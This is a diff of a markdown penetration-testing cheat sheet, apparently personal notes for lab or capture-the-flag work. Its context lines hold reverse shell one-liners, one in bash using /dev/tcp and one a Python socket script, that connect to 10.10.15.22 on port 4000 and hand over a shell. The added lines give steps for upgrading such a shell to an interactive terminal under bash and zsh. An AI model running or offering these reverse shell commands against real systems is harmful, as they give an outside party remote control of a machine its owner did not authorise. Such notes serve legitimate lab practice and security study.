@@ -152,9 +152,10 @@ bash -i >& /dev/tcp/10.10.15.22/4000 0>&1
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.22",4000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
 ### Interactive Shell
-#### Python 
+* can be executed with python or python3
+#### Bash 
 ```python
-python -c 'import pty; pty.spawn("/bin/bash")'
+python(3) -c 'import pty; pty.spawn("/bin/bash")'
 ```
 ```cmd
 Ctrl-Z
@@ -164,6 +165,16 @@ stty raw -echo
 ```
 ```
 fg
+```
+#### Zsh 
+```python
+python(3) -c 'import pty; pty.spawn("/bin/bash")'
+```
+```cmd
+Ctrl-Z
+```
+```cmd
+stty raw -echo; fg
 ```
 ## Usefuls Scripts
 ### HEX Converter
